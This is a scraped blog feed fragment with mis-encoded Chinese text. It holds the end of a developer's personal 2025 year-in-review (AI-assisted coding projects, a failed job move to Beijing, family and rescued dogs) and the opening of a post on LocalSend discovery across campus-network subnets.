<h3 id="ä»å¹´å¨trae-æ¹é¢çå®è·µ">ä»å¹´å¨Trae æ¹é¢çå®è·µï¼</h3>
<ol>
<li><a href="https://juejin.cn/post/7462542925915848744" target="_blank" rel="noopener nofollow">å­èè·³å¨æ¨åºAIç¼ç¨ç¥å¨Traeï¼åºäºTrae ä» 0 å¼åä¸ä¸ªGoogle æä»¶ï¼</a><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154541565-1153543642.png" class="lazyload"></li>
</ol>
 <hr> 
<hr> 
<p>2.<a href="https://github.com/TickHaiJun/Dompet-App-React-Native" target="_blank" rel="noopener nofollow">åºäºTrae å¼åçç¬¬ä¸ä¸ªAPP</a></p>
<p>Trae ååºæ¥Claudeæ¨¡åæ¶ï¼è¿å¤æµè¯å®çè½åï¼å½æ¶è±äº5ä¸ªå°æ¶æåºä¸ä¸ªAppï¼é¡¹ç®å¹¶ä¸è¿å¼æºäº<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154605040-710350693.png" class="lazyload"></p>
<hr> 
<ol start="3">
<li><a href="https://github.com/TickHaiJun/Podcast" target="_blank" rel="noopener nofollow">åºäºTrae è®¾è®¡çååç¨¿</a></li>
</ol>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154616548-830934542.png" class="lazyload"></p>
<p>æä¹å¼å§ç¢°è§é¢ãè¯´å®è¯ï¼ä¸å¼å§å¾ç¼çï¼åªä¸ä¸ªä¸åéçè§é¢ï¼è¦è±æä¸¤ä¸ä¸ªå°æ¶ãå¡ç¹ãéä¹ãå­å¹ãèå¥ï¼åªä¸æ ·é½ä¸åçèµ·æ¥é£ä¹ç®åãæä¸åº¦æçæ¯ä¸æ¯æä¸éåï¼ä½åä¸çå¿ãæç¥éè¿æ¯ä¸åæä¹åæ²¡å°è¯è¿çè½åï¼ä¸æ¦ç»åºæ¥ï¼å°±æ¯æ°çè·¯ã</p>
<p><a href="https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1" target="_blank" rel="noopener nofollow">åºäºTraeè¿åäºååè¿åè®¾è®¡ç¨¿ï¼æ²¡æ³å°è§é¢ç«äº</a><br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154623908-888239039.png" class="lazyload"></p>
<hr> 
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154629072-645488754.png" class="lazyload"></p>
<p>è¿ä¸æ®µç»æçç¤¼ç©ï¼æ¯ä¸ç§æ´ç¨³å®çèªä¿¡ï¼å¾å¤äºçèµ·æ¥å¤æï¼åªè¦æå¼ãä¸æ­¥æ­¥åï¼å°±ä¼åå¾å¯æ§ã</p>
<hr>
<h2 id="2-æææ³æ³åæäºä½åéè¿vibe-coding">2. æææ³æ³åæäºä½åéè¿Vibe Coding</h2>
<p>äºæå°å«æï¼æè¿å¥äºä¸ç§âæéææ´»âçç¶æã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154639946-1131692297.png" class="lazyload"></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect" target="_blank" rel="noopener nofollow">ä»æµæå°è½å°ï¼è®°å½æä»¬ç¬¬ä¸æ¬¡æåå°å¤§æ¨¡åâå¡âè¿ä¸å¡çæ²æåç¨</a></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154652143-1447815485.png" class="lazyload"></p>
<p>å¹´ååäºèªå·±ç¬¬ä¸æ¬¾AIåºç¨</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154658992-1414743353.png" class="lazyload"></p>
<p>é£æ®µæ¶é´æåäºå¾å¤ä½åï¼ä¹å¼æºäºä¸å°ä¸è¥¿ãè¯´ç½äºï¼å°±æ¯ææ³æ³ä»èå­éæåºæ¥ï¼åæä¸ä¸ªè½è·ãè½çãè½ç¨ãè½è¢«å«äººçè§£çä¸è¥¿ã</p>
<p>ä¸æ­¤åæ¶ï¼æä¹ç»å¢éåäºå¤æ¬¡åäº«ï¼è®²ææè¿å¨åä»ä¹ãæä¹åãè¸©äºä»ä¹åãæä¹ç»å¼ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154706427-993472232.png" class="lazyload"></p>
<p>ä¸­é´æä¸¤æ¬¡æºä¼æå°è±¡å¾æ·±ï¼ä¸æ¬¡æ¯æ¥èªä¸å®¶å¾å¤§çå¨è¯¢å¬å¸ï¼ä¸æ¬¡æ¯åºæµ·æ¹åçè¿ç¨éè¯·ãå®ä»¬é½æºè¯±äººï¼ä½æå½æ¶é½æç»äºãåå å¾ç®åï¼æç¥éæè¿æ²¡åå¤å¥½ãè½åæ²¡å°é£ä¸ªååº¦ãå¿ææ²¡å°é£ä¸ªç¨³å®åº¦ï¼æä¸æ³é è¿æ°ä¸å»ï¼ç¶åé ç¡¬ææä½ã</p>
<p>ä¹æä¸äºå°å°çæåï¼æäººä¹°äºæåçä¸è¥¿ï¼è½ç¶æ°éä¸ç®å¤ï¼ä½è¶³å¤è®©æç¡®è®¤ââæåçä¸è¥¿ä¸æ¯èªå¨ï¼æ¯ççæäººéè¦ãæ´éè¦çæ¯ï¼è¶æ¥è¶å¤çç½åéè¿æçåå®¹è®¤è¯æï¼èç³»æï¼é®æé®é¢ã</p>
<p>é£å ä¸ªæææå¤§çæ¶è·ä¸æ¯âåäºå¤å°âï¼èæ¯ä¸ä¸ªæ´æ´ç´ çç»è®ºï¼<strong>æ³æ³ä¸å¼é±ï¼ååºæ¥æå¼é±ã</strong></p>
<hr>
<h2 id="3-æäººæ¿æä¸ºæçè½åä¹°å">3. æäººæ¿æä¸ºæçè½åä¹°å</h2>
<p>ä¹æå°åä¸æï¼æçå¯ä¸å¼å§åä¸é¨âæ­£ç»äºâã</p>
<p>å¨è¯¢åå¤äºãæçæ¯ä¸´æ¶é®ç­ï¼æçæ¯æ´ç³»ç»çéªè·ãææ¥äºä¸ä»½éªè·ï¼ä¹å æ­¤è®¤è¯äºå ä½å¾æç¼çæåï¼é½æ¯å±±è¥¿çãæä»¬èé¡¹ç®ãèéæ©ãèæä¹æäºæåæï¼ä¹èæä¹å¨ç°å®éä¸æèªå·±å¼ä¸¢ã</p>
<p>è¿ä»½å³ç³»å¾çè´µãå®ä¸æ¯é£ç§äºç¸å¹æ§çç­é¹ï¼èæ¯æè½ææ¾æå°ï¼å¯¹æ¹å ä¸ºæçå»ºè®®å°èµ°äºå¼¯è·¯ï¼äºææ¨è¿å¾æ´é¡ºï¼èæä¹å ä¸ºå¯¹æ¹çåé¦åå¾æ´åå®ãé£ç§âæççå¸®å°äºäººâçæå°±æï¼æ¯æ°å­æ´å®å¨ã</p>
<p>æä¹å¨è¿ä¸æ®µç¬¬ä¸æ¬¡æ´æ¸æ°å°çå°æçä½ç½®ï¼æä¸æ¯åªè½åå¤´åé¡¹ç®çäººï¼æè¿å¯ä»¥æç»éªè®²æ¸æ¥ï¼æå¤ææç®åï¼æå«äººå¡ä½çç¹æåºæ¥ãè¿æ¯ä¸ç§è½åï¼ä¹æ¯ä¸ç§è´£ä»»æã</p>
<p>è¿ä¸æ®µè®©æç¸ä¿¡ï¼é èªå·±æåºæ¥çå£ç¢ï¼æ¢ï¼ä½ç¨³ã</p>
<hr>
<h2 id="4-æéæ°ç¡®è®¤äºé±è¯¥è±å¨åª">4. æéæ°ç¡®è®¤äºâé±è¯¥è±å¨åªâ</h2>
<p>å½åºæåå®¶äººèªé©¾åºå»ç©äºä¸è¶ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154715567-288570006.png" class="lazyload"></p>
<p>é£å¾å¤§ï¼å¤©å¾é«ï¼ç¾èå¾é¦ãæä»¬å¨èåä¸å¾äºä¸å¤©ï¼æç»ç¶æ¯å®æäºè¶éå¡ä¸è½¦ï¼è®©ä»ä»¬å¨èå°ä¸è·ä¸åï¼æåå§å§éªäºé©¬ï¼ç¬å¾ååå°å°æ¶åãé£å å¤©æå¾æ¾æ¾ï¼çè³æç¹ææââåæ¥æåªåè¿ä¹ä¹ï¼ææ³æ¢æ¥çå¹¶ä¸æ¯æä¸ªå¤´è¡ï¼èæ¯è¿ç§âæè½è®©ä»ä»¬å¼å¿âçåºæ°ã</p>
<p>æä»¥åå¯¹è±é±å¾è°¨æï¼æ»è§å¾è¦æçãè¦ç®è®¡åæ¥ãå¯å½ææé±è±å¨å®¶äººèº«ä¸ï¼é£ç§èå¦å¾ç´æ¥ï¼ä¸éè¦è¯æï¼ä¸éè¦è§£éï¼è±åºå»å°±æ¯ä¸ç§âææå¾ä½äºâçç¡®è®¤ã</p>
<hr>
<h2 id="5-å»åäº¬ä¸è¶ææèå­æ¡äºåæ¥">5. å»åäº¬ä¸è¶ï¼ææèå­æ¡äºåæ¥</h2>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154723557-522141844.png" class="lazyload"></p>
<p>åææå»åäº¬åå äºä¸ä¸ªæ´»å¨ï¼ä¹ç®ç¬¬ä¸æ¬¡ä¸ºäºè¿ç±»äºåºè¿é¨ã2026å¹´ï¼å¤è¾åºAIï¼å¤åå æ´»å¨ã</p>
<p>ç°åºäººå¾å¤ï¼èå¥å¾å¿«ï¼ä¿¡æ¯å¯å¾è®©äººåä¸è¿æ°ãé£å¤©ææå¤§çæåï¼ä¸æ¯è§äºä»ä¹äº§åï¼èæ¯çªç¶æç½ï¼æºä¼ççä¼ä»æèº«è¾¹èµ°è¿å»ï¼èµ°è¿å»å°±æ²¡äºãå¾å¤æ¶åä¸æ¯æä¸å¤å¥½ï¼æ¯æä¸æ¢ç«åºæ¥ï¼æèæä¸æè¯è§å¾âæè¿ä¸å¤æ ¼âã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154732860-301297098.png" class="lazyload"></p>
<p>å»å¤©æ´¥è·¯ä¸ï¼çæçæè§</p>
<p>æä¹å»äºå¤©æ´¥ï¼è§äºèæåèæãæä»¬èäºä¸æ´å¤©ï¼æå¸®ä»æ¬è¿æ´çé£åï¼ä»å¸¦æåäºå¤©æ´¥èï¼çè³è®©æä½éªäºä¸æä¿æ¶æ· 911ãæåä»ææéå°æºåºã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154741516-298271030.png" class="lazyload"></p>
<p>é£ä¸å¤©è®©æå¾ææ¨ï¼è¿ä¸ªä¸çå¶å®å¾å¤§ï¼ä¹å¾æ´»ï¼æä¸è½æ»æèªå·±å°å¨âæéº»ç¦ãæå°´å°¬ãæåºä¸âçæç»ªéã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154747190-1732708869.png" class="lazyload"></p>
<p>ä»å¹´æä¹ä¹°äºä¸å°ä¹¦ï¼ä¹è¯»äºä¸å°ä¹¦ããäº²å¯å³ç³»ããè®¤ç¥é©±å¨ããçº³ç¦å°å®å¸ãâ¦â¦å®ä»¬æ²¡æç»ææ åç­æ¡ï¼ä½ç»äºææ´æ¸éçè§è§ï¼æè¦å¯¹èªå·±çæç»ªè´è´£ï¼å¯¹èªå·±çéæ©è´è´£ï¼å¯¹èªå·±çé¿æè´è´£ã</p>
<hr>
<h2 id="6-æç¸ä¿¡è¿ä»ä¹å æ­¤å®æäºä¸æ¬¡ç¥é­">6. æç¸ä¿¡è¿ä»ï¼ä¹å æ­¤å®æäºä¸æ¬¡ç¥é­</h2>
<p>åä¸æåºï¼æåäºä¸ä¸ªå¾éçå³å®ï¼ç¦»èï¼å»åäº¬è¯ä¸æ¬¡ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154752744-2124682398.png" class="lazyload"></p>
<p>è¿ä»¶äºæå¹¶ä¸æ¯å²å¨ãç¸åï¼ææ³äºå°è¿ä¸ä¸ªæãæåâä»âéè¯·è¿æä¸æ¬¡ï¼åä¸¤æ¬¡æé½æç»äºãç¬¬ä¸æ¬¡åå§äººäº²èªæ¾æï¼è¯è¯´å¾å¾æ¼äº®ï¼æªæ¥ç»å¾å¾å¤§ï¼èæä¹ç¡®å®å¨é£ä¸ªé¶æ®µæ¸´æä¸æ¬¡æ´å¤§çç©ºé´ãåå ä¸å¯¹âä»âçä¿¡ä»»ï¼ææç»ç¹äºå¤´ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154759317-1347714350.png" class="lazyload"></p>
<p>ç¦»å¼åï¼æåäºä¸ä»¶æå¾æ³åçäºï¼æç¸ç¸æ¥å°ä¸æµ·ãé£æ¯ä»ç¬¬ä¸æ¬¡æ¥ä¸æµ·ï¼ä¹æ¯ä»ç¬¬ä¸æ¬¡åé£æºãæå»æ¥ä»çæ¶åï¼ä»è¸ä¸çåæ¦èä¸ä½ãæå¸¦ä»éäºå¾å¤å°æ¹ï¼æäºå¾å¤ç§çãéä»å»æºåºé£å¤©ï¼æå¿éå¾è¸å®ââé£ç§æå°±æï¼ä¸æ¥èªä»»ä½è¯ä»·ï¼åªæ¥èªâæè½å¸¦ä»çä¸çâçç¬é´ã</p>
<p>ä»å¹´æä¹ç»å¦å¦ä¹°äºæ°ææºï¼å¥¹ä¹åé£é¨å¤ªå¡äºãåå°çäºæï¼è½å¨ç¶æ¯èº«ä¸é½æ¯å®å¨çæ¹åã</p>
<p>ç¶åæå»äºåäº¬ã</p>
<p>ç°å®å¾å¿«ç»äºæä¸è®°é·æ£ãä¹åè¯´çåå®éå·®å¤ªå¤å¤ªå¤ãæä¼å¨å¾ç­æ¶é´ååç°ï¼æäºè¯åªæ¯è¯ï¼æäºæ¿è¯ºåªæ¯æç»ªï¼æäºâæ ¼å±âåªæ¯åè£ãæä¸æ³å¨è¿éåå·ä½ç»èï¼ä½æå¯ä»¥åç»è®ºââè¿æ¬¡ç»åè®©æå®æäºä¸æ¬¡ç¥é­ï¼å¯¹äººãå¯¹æè°âæºä¼âãå¯¹âçèµ·æ¥å¾ç¾âçæªæ¥ã</p>
<p>æä¹æ´æ¸æ¥äºä¸ä»¶äºï¼æå¹¶ä¸æ¯ä¸è½åè¦ï¼ææ¯ä¸æ¿æææçå°ä¸¥åæ¶é´æ¼å¨ä¸é è°±çäººåä¸é è°±çäºä¸ã</p>
<hr>
<h2 id="7-ææäºä¸åªçä¹è¢«è¿åº§åå¸çåææ¥ä½">7. ææäºä¸åªçï¼ä¹è¢«è¿åº§åå¸çåææ¥ä½</h2>
<p>è¿ä¸å¹´ææäºä¸åªçã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154806749-1255965763.png" class="lazyload"></p>
<p>ç¬¬ä¸åªæ¯ä¸­åç°å­ç¬ï¼å¨å¬å­éå°çãå®å¾ç¦ï¼ç¼ç¥æ¯ï¼ä½åä¸èº²äººã</p>
<p>ç¬¬äºåªæ¯è¾¹ç§ï¼å¨å¬å¸éè¿ï¼å®æ´åæ¯èµ°ä¸¢çå­©å­ï¼èªæåæ å©ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154813108-1263644004.png" class="lazyload"></p>
<p>ç¬¬ä¸åªæ¯é¿ææ¯å ï¼å¨è±«å­éè¿ï¼ä½åå¾å¤§ï¼å´ä¸ç¹å®å¨æé½æ²¡æã</p>
<p>æåæ¬¢çãéè§å®ä»¬çæ¶åï¼æå¾é¾è£ä½æ²¡çè§ãæåçäºå¶å®ä¹ä¸å¤æï¼æç§ãåå¸ãèç³»ãç­éé¢å»äººãæä¿¡æ¯å¯¹é½æ¸æ¥ï¼ç¶åéå®ä»¬å»æ°å®¶ã</p>
<p>è¿ä»¶äºææå¨æçï¼ä¸æ¯æå¤åè¯ï¼èæ¯æåç°ï¼å¤§åå¸ççæå¾å¤æ¿æä¼¸æçäººãæååºæ±å©ï¼ççä¼æäººååºãæä»¥ä¸ºæå¨æå®ä»¬ï¼å¶å®å¨æäºæ¶å»ï¼æ¯è¿äºåæå¨ææä»ç²æ«éæ¥ä½ã</p>
<hr>
<h2 id="8-ä¸ç¬æ²æ²¡ææ¬æ­¢æç»´æåä¸åå§å±èªå·±">8. ä¸ç¬æ²æ²¡ææ¬ï¼æ­¢æãç»´æãåä¸åå§å±èªå·±</h2>
<p>åäºæåï¼åäº¬ç»äºææç¡¬çä¸è¯¾ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154821656-1585583893.png" class="lazyload"></p>
<p>æå¨åäº¬å¾äºåæ¥å¤©ï¼ä¸ç´ä½éåºãå¯¹æ¹ä¹åè¯´ä¼æ¥éï¼ä½åæ¥ä»ä¹é½æ²¡æãå¥èåä¸å¤©ææ¾äºæ¿å­ï¼ç§æ¿è´¹ç¨ãä¸­ä»è´¹ç¨ãåå ä¸åç§å¥æ³¢ææ¬ï¼å èµ·æ¥æ¯ä¸ç¬ä¸å°çæ¯åºãæ´ç³çæ¯ï¼å¥èç¬¬ä¸å¤©æå°±éè¿å¦ä¸ä½åæ ·å¤å¢çäººäºè§£å°äºçå®æåµï¼åå ä¸âä»âä¸ç­åè¯´çä¸äºè¯ï¼æå¾å¿«ç¡®å®ââè¿éä¸æ¯æè¯¥å¾çå°æ¹ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154826834-1184767807.png" class="lazyload"></p>
<p>é£ä¸å»æé¾çå¶å®ä¸æ¯ç¦»å¼ï¼èæ¯é¢å¯¹æ²æ²¡ææ¬ãæå·²ç»ä»åºé£ä¹å¤ï¼æä¼æ¬è½å°æ³âåå¿å¿ï¼åç­ç­âãä½æå¾åºå¹¸ï¼é£å¤©ææ²¡éªèªå·±ãæéæ©æ­¢æã</p>
<p>éä¹èæ¥çå°±æ¯ç»´æãæ¿å­ææ²¡å¥ä½ï¼ååæ¥æä¹æ²¡å¼å§ï¼ä½ç®¡å®¶å¾æ èµï¼çè³å¸¦çæåãé£ç§âæè®²çä»å°±èèµâçæè§å¾æ¶å¿ãæä¸å¼å§ä¹å¾ç¦ï¼åæ¥å¹²èä¸åå¥¹åºè¯ï¼ç´æ¥èµ°æµç¨ï¼éè¿ 12315 åè°ï¼æ¿åäºä¸é¨åãçè®ºä¸å¯ä»¥æ¿åæ´å¤ï¼ä½è¦ç»§ç»­èæ¶é´ç²¾åï¼æå½æ¶éæ©å°æ­¤ä¸ºæ­¢ã</p>
<p>è¿ä¸æ®µæ¶é´ï¼è®©å®¶éä¹æ²¡å°æå¿ï¼å....</p>
<p>æææ³åç»èªå·±çä¸æ¯âé±äºäºâï¼èæ¯ä¸ä¸ªæ´éè¦çç»è®ºï¼<strong>ä»¥åéå°ä¸å¬ï¼æä¸åç¨å§å±æ¢åå¹³ãè¯¥ç»´æå°±ç»´æï¼è¯¥ç¿»è¸å°±ç¿»è¸ã</strong></p>
<hr>
<h2 id="9-åå°ä¸æµ·ææèªå·±ä¸ç¹ç¹æåæ­£è½¨">9. åå°ä¸æµ·ï¼ææèªå·±ä¸ç¹ç¹æåæ­£è½¨</h2>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154833625-691020076.png" class="lazyload"></p>
<p>åäºæä¸­æ¬æåå°äºä¸æµ·ã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154838643-199424343.png" class="lazyload"></p>
<p>æ¶æ¾å¥½å®¶éçå·¥ä½</p>
<p>é£æ®µæ¶é´æè½éå¾ä½ãä¸æ¯ç´¯ï¼æ¯ä¸ç§è¢«ç°å®æè¿ä¹åçéãæä¼æçèªå·±ãæçå¤æ­ãæçä¿¡ä»»ï¼çè³æçâæ¯ä¸æ¯æå¤ªææäºâãä½çæ´»ä¸ä¼ç­æç¼è¿æ¥ï¼å®åªä¼ç»§ç»­å¾åã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202601/1654515-20260116154846060-1154962087.png" class="lazyload"></p>
<p>æåçç¬¬ä¸ä»¶äºæ¯ææèªå·±æåæ­£å¸¸ï¼åé¥­ãç¡è§ãè§æåãåæ¥æåèè¿å»äºæ­å·æ£å¿ãåå¸å¾å®éï¼èµ°å¨è·¯ä¸æçªç¶åç°ï¼é£è¿æ¯ä¸æ ·å¹ï¼ç¯è¿æ¯ä¸æ ·äº®ï¼æä¸ä¼å ä¸ºåæ«å°±å¤±å»æå¤©ã</p>
<p>ææ¢æ¢æ§ä½åºäºãæçæ´»æåæ­£è½¨äºãä¹æé£å¥æéè¦çè¯éæ°æ¡åæ¥ââ<strong>æå¨åå¼ºï¼ä¹å¨éæ°éæ©èªå·±çäººçç»æã</strong></p>
<hr>
<h2 id="æå">æå</h2>
<p>åå¤´ç 2025 å¹´ï¼ææå¤§çååä¸æ¯âæåäºå¤å°âï¼èæ¯<strong>æå¯¹äººçç»æçè¦æ±åé«äº</strong>ã</p>
<p>ä»¥åæä¼æåªåå½æç­æ¡ãç°å¨ææ´å¨æï¼è¿ä»½åªåè½ä¸è½æ²æ·ï¼è½ä¸è½è®©ææ¥ææ´å¤éæ©æãä»¥åæéå°çäºä¼åå¿ï¼æ³çâç®äºâãä½åäº¬é£ä¸æ®µä¹åææ´ç¡®å®ï¼å§å±ä¸ä¼æ¢æ¥å°éï¼åªä¼æ¢æ¥ä¸ä¸æ¬¡æ´å¤§çä»£ä»·ãè¯¥æ­¢æå°±æ­¢æï¼è¯¥ç»´æå°±ç»´æââåªææ²æ²¡ææ¬å·²ç»ç ¸ä¸å»ï¼æä¹è¦æèªå·±ä»æ³¥éæåºæ¥ã</p>
<p>è¿ä¸å¹´æä¹å®æäºä¸æ¬¡ç¥é­ï¼<br>
å¯¹âæºä¼âçç¥é­ï¼å¯¹âå³ç³»âçç¥é­ï¼å¯¹âç»åºæ¥çæªæ¥âçç¥é­ã<br>
æå¼å§ç¸ä¿¡ä¸å¥è¯ï¼<strong>çæ­£å¼å¾çæºä¼ï¼ä¸ä¼åªé å´è¯´ï¼çæ­£å¯é çäººï¼ä¹ä¸ä¼åªé æç»ªç»æ¶ã</strong></p>
<p>å¦æè¯´ 2025 å¹´æä¼äºæä»ä¹ï¼æè§å¾æ¯ä¸ä»¶äºï¼</p>
<p>ç¬¬ä¸ï¼è½åä¸æ¯æ¿æ¥éå¼ºçï¼æ¯æ¿æ¥ååºçã<br>
æå¨æç¼ççæ¶åï¼é èªå·±æå±é¢ç¨³ä½äºãé£ç§âæè½æä½âçåºæ°ï¼æ¯ççã</p>
<p>ç¬¬äºï¼é±è±å¨å®¶äººèº«ä¸ï¼ä¼åæä¸ç§å¾è¸å®çæå°±æã<br>
æä»¥åä»¥ä¸ºæå°±ææ¥èªå¤çè®¤å¯ï¼ä»å¹´ææ´ç¡®å®ï¼æ¥èªç¶æ¯çç¬ãæ¥èªå®¶äººçå®å¿ãæ¥èªâæå¯ä»¥ç§é¡¾ä»ä»¬âã</p>
<p>ç¬¬ä¸ï¼åææ¯ä¼æµå¨çã<br>
æå¸®è¿äººï¼ä¹è¢«äººå¸®è¿ï¼ææè¿çï¼ä¹è¢«éçäººçç­å¿æ²»æè¿ãä¸çä¸å¨æ¯çäººï¼ä½æå¾å­¦ä¼è¯å«ï¼å­¦ä¼ç­éï¼å­¦ä¼ä¿æ¤èªå·±ã</p>
<p>2026 å¹´æä¸æ³ååå£å·äºãæåªæ³åä¸ä»¶æ´å·ä½çäºï¼</p>
<ul>
<li><strong>æä¸æ¡è½é¿æè·çä¸»çº¿ååºæ¥</strong>ï¼è®©è¾åºãä½ååæå¡çæ­£å½¢æç¨³å®çèå¥ï¼èä¸æ¯é è¿æ°èµ·ä¼ã</li>
<li><strong>ç»ä¿¡ä»»ç«è§ç©</strong>ï¼åä½è¦æè¾¹çï¼æ¿è¯ºè¦è½è½å°ï¼ä»»ä½å³å®é½è¦çåæã</li>
<li><strong>æå®¶æ¾è¿è®¡åé</strong>ï¼ä¸æ¯âæç©ºåè¯´âï¼èæ¯æ¬æ¥å°±è¯¥æå¨åé¢ã</li>
</ul>
<p>2025 å¹´æ²¡ææææ¨å°é«å¤ï¼ä½å®ææä»å¹»è§éæ½åºæ¥äºã<br>
æä¾ç¶ä¼å¾åèµ°ï¼åªæ¯ä»¥åææ´å¨ä¹çä¸æ¯éåº¦ï¼èæ¯æ¹åï¼ä¸æ¯ç­é¹ï¼èæ¯ç»æã</p>
<p><strong>æå¨åå¼ºï¼ä¹å¨éæ°éæ©èªå·±çäººçç»æã</strong></p>
<p>å¸æ2026å¹´ä¸åé¡ºå©!</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1654515/202509/1654515-20250919164521947-329959870.png" class="lazyload"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 15:50">2026-01-16 15:50</span>&nbsp;
<a href="https://www.cnblogs.com/HaiJun-Aion">ç¨åºåæµ·å</a>&nbsp;
éè¯»(<span id="post_view_count">258</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19492492);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19492492', targetLink: 'https://www.cnblogs.com/HaiJun-Aion/p/19492492', title: 'æç2025ï¼åé¡¹ç®ãè·å¯ä¸ãè§äººãå¥æ³¢ãæ¬å®¶ãç»´æãååä¸æµ·' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãå°è®°ãè§£å³æ ¡å­ç½ä¸­åæ­äºéçä¸åå­ç½é´ç LocalSend åç°é®é¢ ]]></title>
    <link>https://www.cnblogs.com/somebottle/p/19497343/simple_report_of_localsend_switch</link>
    <guid>fd55484963afb65904d97cbc88faf316</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/somebottle/p/19497343/simple_report_of_localsend_switch" title="åå¸äº 2026-01-17 23:05">
    <span role="heading" aria-level="2">ãå°è®°ãè§£å³æ ¡å­ç½ä¸­åæ­äºéçä¸åå­ç½é´ç LocalSend åç°é®é¢</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/2588810/202601/2588810-20260117230317162-937114161.png" alt="ãå°è®°ãè§£å³æ ¡å­ç½ä¸­åæ­äºéçä¸åå­ç½é´ç LocalSend åç°é®é¢" class="desc_img">
        è¿åæ¥æè¾ä¸ä¸æä¹å¨å¤æ­éç¦»ãåæ­åè®¸çå±åç½ï¼æ¯å¦æ ¡å­ç½ï¼å­ç½ä¹é´å®ç° LocalSend å®¢æ·ç«¯çäºç¸åç°ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>åä½å¥½ä¹ä¸è§~ä¸åå¹´åæ¯å¿è®ºæåæ¯å¿é¡¹ç®çï¼å®å¨æ¯æ²¡ä»ä¹æ¶é´æ´æ°ç¬è®°äºãè¶çä»å¤©æç¹ç©ºé²ï¼å±æ¥ååæè¿æ½ç©ºè§£å³çä¸ä¸ªå°ç½ç»é®é¢å­ï¼ãã¼ãï¼ã</p>
<h2 id="0-é®é¢èæ¯">0. é®é¢èæ¯</h2>
<p>å±å®éªå®¤æä¸å°è¿æ¥çæå°æºçè®¡ç®æºï¼æä»¬å¨è¿å°æºå¨ä¸æäºä¸ä¸ªä¸é¨æ³¨åç QQ è´¦å·ï¼éè¦æå°æä»¶æ¶ææä»¶åéå°è¿ä¸ª QQ è´¦å·ä¸ï¼å¨æå°æºè®¡ç®æºä¸ä¸è½½ä¸æ¥å°±è¡äºã</p>
<p>ä½æ¯å§ï¼åæ¯æ¯è¾æºå¯æä»¶çè¯ï¼å¦æè¿æ ·è¿ä¸éå«äººçæå¡å¨æè§ä¸å¤ªå¥½ï¼æ­£å¥½å±å½æ¶ä¹æ¾å°äºå±åç½æä»¶ä¼ è¾å·¥å· LocalSendï¼éè¯äºè¯ã</p>
<p>ç»ææåç°ï¼æå°æºè®¡ç®æºä¸ç LocalSend å®¢æ·ç«¯æ æ³åç°æç¬è®°æ¬ä¸ç LocalSend ç«¯ï¼åä¹äº¦ç¶ãæè¿å¾å°æå°æºè®¡ç®æºä¸æå¨è¾å¥ç¬è®°æ¬çµèè¢«åéç IP å°åæè½ä¼ è¾æä»¶ï¼ç¥æ¾éº»ç¦ã</p>
<ul>
<li>æ´ä¸ææ ¡å­ç½è¿æçº¿ç½åæ çº¿ç½ç»è®¾å¤åéçå¨æ¯å¨æ IPï¼å¯è½è¿ä¸æ®µæ¶é´å°±ä¼åã</li>
</ul>
